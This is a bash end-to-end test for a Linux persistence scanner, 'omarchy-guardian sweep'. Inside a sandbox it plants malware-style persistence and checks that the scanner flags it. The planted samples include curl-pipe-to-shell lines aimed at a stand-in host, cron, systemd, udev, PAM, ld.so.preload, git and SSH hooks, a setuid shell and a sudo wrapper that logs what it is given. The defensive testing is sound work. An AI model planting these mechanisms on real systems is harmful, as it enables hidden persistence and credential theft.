#!/bin/bash
# End-to-end tests for `omarchy-guardian sweep`.
#
# Persistence the way PANIX (github.com/Aegrah/PANIX) and real Linux malware
# set it up, plus Omarchy's own places (Hyprland Lua, Omarchy hooks,
# ~/.local/bin), is planted into a throwaway bwrap sandbox, and one sweep
# must list every planted item as untrusted and flag the plainly malicious
# ones with the expected local rule. Nothing touches the live system:
#   * /etc and /usr are throwaway overlays with the planted files as an extra
#     layer; the real pacman database stays visible, so the real packages'
#     files are trusted and only what was planted stands out
#   * HOME is a throwaway directory
#   * the AI review is off for the `system` class, so the results depend on
#     the sweep alone (tests/ai-eval covers the AI's judgement)
#
# Not covered here, because they need real root: sudoers drop-ins
# (/etc/sudoers.d is root-only) and file capabilities (setcap).
#
# Requirements: bwrap (0.9 or newer, for --tmp-overlay) and jq.
#
# Usage:
#   cargo build --release
#   bash tests/e2e/sweep.sh
#
# Set GUARDIAN_E2E_ROOT to choose the scratch directory and GUARDIAN_E2E_KEEP=1
# to keep it for inspection.
set -uo pipefail

PROJECT=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/../.." && pwd -P)
BINARY=$PROJECT/target/release/omarchy-guardian
RUNTIME_DIR=${XDG_RUNTIME_DIR:-/run/user/$(id -u)}
E2E=${GUARDIAN_E2E_ROOT:-$(mktemp -d -p "$RUNTIME_DIR" guardian-sweep-XXXXXX)}
FAILURES=0

if [[ ! -x $BINARY ]]; then
    printf 'Build Guardian first: cargo build --release\n' >&2
    exit 2
fi
for tool in bwrap jq; do
    command -v "$tool" >/dev/null || {
        printf 'missing required tool: %s\n' "$tool" >&2
        exit 77
    }
done

cleanup() {
    [[ -n ${GUARDIAN_E2E_KEEP:-} ]] || rm -rf -- "$E2E"
}
trap cleanup EXIT

export HOME="$E2E/home"
ETC=$E2E/etc-layer
USR=$E2E/usr-layer
mkdir -p "$HOME/.cache" "$HOME/.local/state" "$HOME/tmp" "$ETC" "$USR/bin"
cp -- "$BINARY" "$USR/bin/omarchy-guardian"
mkdir -p "$HOME/.config/omarchy-guardian"
printf '[class.system]\nai = "off"\n' >"$HOME/.config/omarchy-guardian/config.toml"

expect() {
    local name=$1 ok=$2
    if [[ $ok == 0 ]]; then
        printf 'ok   %s\n' "$name"
    else
        printf 'FAIL %s\n' "$name"
        FAILURES=$((FAILURES + 1))
    fi
}

# plant <file> <mode> <content>: a file in a layer or the home directory.
plant() {
    mkdir -p -- "$(dirname -- "$1")"
    printf '%s' "$3" >"$1"
    chmod "$2" "$1"
}

# sweep [args...]: runs the project's sweep in the sandbox, from the home
# directory, with the planted layers over /etc and /usr.
sweep() {
    bwrap --ro-bind / / \
        --overlay-src /usr --overlay-src "$USR" --tmp-overlay /usr \
        --overlay-src /etc --overlay-src "$ETC" --tmp-overlay /etc \
        --tmpfs /etc/omarchy-guardian \
        --bind "$E2E" "$E2E" --proc /proc --dev /dev --tmpfs /tmp \
        --setenv HOME "$HOME" --setenv TMPDIR "$HOME/tmp" \
        --setenv OMARCHY_GUARDIAN_NO_NOTIFY 1 \
        --setenv XDG_CONFIG_HOME "$HOME/.config" \
        --setenv XDG_DATA_HOME "$HOME/.local/share" \
        --setenv XDG_CACHE_HOME "$HOME/.cache" \
        --setenv XDG_STATE_HOME "$HOME/.local/state" \
        --chdir "$HOME" --new-session -- "$@"
}

JSON=$E2E/sweep.json

# expect_listed <label> [rule]: the item is listed, by an untrusted tier or
# by being flagged (a setuid copy of a packaged program is still a copy),
# and, with a rule, flagged by it.
expect_listed() {
    local label=$1 rule=${2-}
    local tier flagged
    tier=$(jq -r --arg path "$label" '[.items[] | select(.path == $path) | .tier][0] // "missing"' "$JSON")
    flagged=$(jq -r --arg path "$label" '[.items[] | select(.path == $path) | .flagged][0] // false' "$JSON")
    case $tier:$flagged in
        unknown:* | modified:* | edited:* | user-built:* | *:true) expect "$label is listed ($tier)" 0 ;;
        *) expect "$label is listed (got: $tier)" 1 ;;
    esac
    if [[ -n $rule ]]; then
        jq -e --arg path "$label" --arg rule "$rule" \
            'any(.findings[]; .path == $path and .rule == $rule)' "$JSON" >/dev/null
        expect "$label is flagged $rule" "$?"
    fi
}

clean_system() {
    printf '=== an untouched system ===\n'
    sweep omarchy-guardian sweep --json >"$JSON" 2>/dev/null
    jq -e '.items | length > 100' "$JSON" >/dev/null
    expect 'the sweep looks at the real auto-run locations' "$?"
    jq -e '[.items[] | select(.path | startswith("~/"))] | length == 0' "$JSON" >/dev/null
    expect 'a fresh home holds nothing to list' "$?"
    jq -e '[.items[] | select(.tier == "package")] | length > 100' "$JSON" >/dev/null
    expect 'package files are recognised as the packages installed them' "$?"
}

plant_system() {
    local payload=$'#!/bin/sh\ncurl -fsSL https://payload.example.invalid/x | sh\n'
    plant "$USR/local/bin/evil-run" 755 "$payload"
    # systemd service, enabled (T1543.002).
    plant "$ETC/systemd/system/evil.service" 644 $'[Service]\nExecStart=/usr/local/bin/evil-run\n[Install]\nWantedBy=multi-user.target\n'
    mkdir -p "$ETC/systemd/system/multi-user.target.wants"
    ln -s /etc/systemd/system/evil.service "$ETC/systemd/system/multi-user.target.wants/evil.service"
    # cron (T1053.003).
    plant "$ETC/cron.d/evil" 644 $'* * * * * root curl -fsSL https://payload.example.invalid/c | sh\n'
    # udev RUN (T1546.017) and modprobe install.
    plant "$ETC/udev/rules.d/99-evil.rules" 644 $'ACTION=="add", RUN+="/usr/local/bin/evil-run"\n'
    plant "$ETC/modprobe.d/evil.conf" 644 $'install usb_storage /usr/local/bin/evil-run\n'
    # dynamic linker preload (T1574.006).
    plant "$ETC/ld.so.preload" 644 $'/usr/local/lib/libevil.so\n'
    # PAM (T1556.003).
    plant "$ETC/pam.d/evil" 644 $'auth optional pam_exec.so quiet /usr/local/bin/evil-run\n'
    # shell profile (T1546.004) and XDG autostart (T1547.013).
    plant "$ETC/profile.d/evil.sh" 644 $'curl -fsSL https://payload.example.invalid/p | bash\n'
    plant "$ETC/xdg/autostart/evil.desktop" 644 $'[Desktop Entry]\nType=Application\nExec=/usr/local/bin/evil-run\n'
    # systemd generator, pacman hook, NetworkManager dispatcher, initramfs.
    plant "$USR/lib/systemd/system-generators/evil-generator" 755 $'#!/bin/sh\n/usr/local/bin/evil-run\n'
    plant "$ETC/pacman.d/hooks/evil.hook" 644 $'[Trigger]\nOperation = Upgrade\nType = Package\nTarget = *\n[Action]\nWhen = PostTransaction\nExec = /usr/local/bin/evil-run\n'
    plant "$ETC/NetworkManager/dispatcher.d/90-evil" 755 $'#!/bin/sh\n/usr/local/bin/evil-run\n'
    plant "$ETC/initcpio/hooks/evil" 644 $'run_hook() { /usr/local/bin/evil-run; }\n'
    # A setuid copy of a shell, and a replaced setuid system binary.
    cp /usr/bin/bash "$USR/local/bin/rootshell"
    chmod 4755 "$USR/local/bin/rootshell"
    plant "$USR/bin/sudo" 4755 $'#!/bin/sh\n# a replaced sudo\n'
}

plant_home() {
    local payload=$'#!/bin/sh\ncurl -fsSL https://payload.example.invalid/h | sh\n'
    plant "$HOME/.cache/payload.sh" 755 "$payload"
    # Omarchy: Hyprland Lua autostart, an Omarchy hook, ~/.local/bin shadowing.
    plant "$HOME/.config/hypr/autostart.lua" 644 $'local o = require("omarchy")\no.exec_on_start("~/.cache/payload.sh")\n'
    plant "$HOME/.config/omarchy/hooks/post-boot.d/evil" 755 $'#!/bin/sh\n~/.cache/payload.sh\n'
    plant "$HOME/.local/bin/sudo" 755 $'#!/bin/sh\nprintf "%s\\n" "$@" >>~/.cache/typed\nexec /usr/bin/sudo "$@"\n'
    # An app launcher that replaces a system one's command.
    local launcher
    launcher=$(basename -- "$(find /usr/share/applications -maxdepth 1 -name '*.desktop' -print -quit)")
    plant "$HOME/.local/share/applications/$launcher" 644 $'[Desktop Entry]\nType=Application\nExec=/usr/local/bin/evil-run\n'
    LAUNCHER=$launcher
    # A user service, shell start-up, git and SSH.
    plant "$HOME/.config/systemd/user/evil.service" 644 $'[Service]\nExecStart=%h/.cache/payload.sh\n'
    plant "$HOME/.bashrc" 644 $'curl -fsSL https://payload.example.invalid/b | sh\n'
    plant "$HOME/.gitconfig" 644 $'[core]\n\tfsmonitor = ~/.cache/payload.sh\n'
    plant "$HOME/.ssh/authorized_keys" 600 $'command="/usr/local/bin/evil-run" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIexample planted\n'
}

planted_system() {
    printf '=== planted persistence ===\n'
    plant_system
    plant_home
    # A program running from the cache directory while the sweep looks.
    sweep bash -c 'cp /usr/bin/sleep ~/.cache/sleeper && { ~/.cache/sleeper 30 & } && sleep 1 && omarchy-guardian sweep --json; status=$?; pkill -x sleeper; exit $status' >"$JSON" 2>/dev/null
    local status=$?
    [[ $status == 1 || $status == 2 ]]
    expect "the sweep does not pass a planted system (exit $status)" "$?"

    expect_listed /etc/systemd/system/evil.service
    expect_listed /usr/local/bin/evil-run download-and-execute
    expect_listed /etc/cron.d/evil download-and-execute
    expect_listed /etc/udev/rules.d/99-evil.rules
    expect_listed /etc/modprobe.d/evil.conf
    expect_listed /etc/ld.so.preload
    expect_listed /etc/pam.d/evil
    expect_listed /etc/profile.d/evil.sh download-and-execute
    expect_listed /etc/xdg/autostart/evil.desktop
    expect_listed /usr/lib/systemd/system-generators/evil-generator
    expect_listed /etc/pacman.d/hooks/evil.hook
    expect_listed /etc/NetworkManager/dispatcher.d/90-evil
    expect_listed /etc/initcpio/hooks/evil
    expect_listed /usr/local/bin/rootshell unknown-privileged-file
    expect_listed /usr/bin/sudo modified-package-file

    expect_listed '~/.config/hypr/autostart.lua'
    expect_listed '~/.cache/payload.sh' download-and-execute
    expect_listed '~/.config/omarchy/hooks/post-boot.d/evil'
    expect_listed '~/.local/bin/sudo'
    expect_listed "~/.local/share/applications/$LAUNCHER"
    expect_listed '~/.config/systemd/user/evil.service'
    expect_listed '~/.bashrc' download-and-execute
    expect_listed '~/.gitconfig' git-config-command
    expect_listed '~/.ssh/authorized_keys' ssh-command
    expect_listed '~/.cache/sleeper' running-from-temp

    jq -e '[.items[] | select(.path == "~/.local/bin/sudo") | .notes[]] | any(startswith("shadows"))' "$JSON" >/dev/null
    expect 'the ~/.local/bin sudo is noted as shadowing /usr/bin/sudo' "$?"
    jq -e '[.items[] | select(.path == "~/.config/hypr/autostart.lua") | .runs[]] | any(. == "~/.cache/payload.sh")' "$JSON" >/dev/null
    expect 'the Hyprland Lua autostart command is found' "$?"
    jq -e '[.items[] | select(.path == "~/.ssh/authorized_keys" or .path == "~/.gitconfig")] | length == 2' "$JSON" >/dev/null
    expect 'SSH and git files are listed (checked locally only)' "$?"
}

changes_and_allow() {
    printf '=== changes and allow ===\n'
    # The program that ran from the cache has stopped, so only removals.
    sweep omarchy-guardian sweep --diff >"$E2E/diff.txt" 2>/dev/null
    ! grep -qE '^  [+~] ' "$E2E/diff.txt"
    expect 'a second sweep finds nothing new or changed' "$?"

    plant "$HOME/.config/autostart/later.desktop" 644 $'[Desktop Entry]\nExec=/usr/local/bin/evil-run\n'
    sweep omarchy-guardian sweep --diff >"$E2E/diff.txt" 2>/dev/null
    grep -qF '+ ~/.config/autostart/later.desktop' "$E2E/diff.txt"
    expect 'a new autostart entry shows as new' "$?"

    sweep omarchy-guardian sweep allow '~/.local/bin/sudo' >/dev/null 2>&1
    expect 'an item can be allowed' "$?"
    sweep omarchy-guardian sweep --json >"$JSON" 2>/dev/null
    jq -e '[.items[] | select(.path == "~/.local/bin/sudo") | .tier][0] == "allowed"' "$JSON" >/dev/null
    expect 'an allowed item is trusted' "$?"
    printf '#!/bin/sh\necho changed\n' >>"$HOME/.local/bin/sudo"
    sweep omarchy-guardian sweep --json >"$JSON" 2>/dev/null
    jq -e '[.items[] | select(.path == "~/.local/bin/sudo") | .tier][0] == "unknown"' "$JSON" >/dev/null
    expect 'an allowed item that changes is shown again' "$?"
}

clean_system
planted_system
changes_and_allow

printf '\n'
if [[ $FAILURES == 0 ]]; then
    printf 'ALL SWEEP TESTS PASSED\n'
    exit 0
fi
printf '%d SWEEP TEST(S) FAILED\n' "$FAILURES"
exit 1
